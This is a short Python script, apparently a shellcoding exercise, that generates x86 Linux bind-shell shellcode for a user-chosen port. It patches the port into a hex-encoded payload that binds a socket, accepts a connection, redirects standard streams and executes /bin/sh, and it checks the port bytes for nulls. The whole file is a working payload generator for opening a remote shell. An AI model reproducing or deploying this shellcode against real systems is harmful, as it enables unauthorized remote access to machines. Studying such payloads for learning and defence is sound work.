#!/usr/bin/env python3

import sys

def main(port):

    str_port = hex(port).replace('0x','').zfill(4)

    shellcode = r"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x52\x66\x68{port}\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x02\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80"

    hex_port = "\\x{}\\x{}".format(str_port[:2], str_port[2:])

    if "\\x00" in hex_port:
        print("[-] Sorry, null byte found in that port, chose another port.")
        print("[-] Ports between 1-256 will always contain a null byte.")
        print("[-] Port: {}".format(hex_port))
        sys.exit(1)

    shellcode = shellcode.replace("{port}", hex_port)
    print("[+] Bind shell running on port {}".format(port))
    print("[+] Your Shellcode:")
    print(shellcode)


if __name__ == "__main__":
    if len(sys.argv) == 1:  
        print("Usage: python3 wrapper.py <port>")
        sys.exit(0)

    if int(sys.argv[1]) < 1024:
        print("[!] Warning: Ports < 1024 must be run as a root")

    if len(sys.argv) == 2:
        if (int(sys.argv[1]) > 65535):
            print("Port too large")
            sys.exit(1)
        main(int(sys.argv[1]))
    else:
        main(1337)
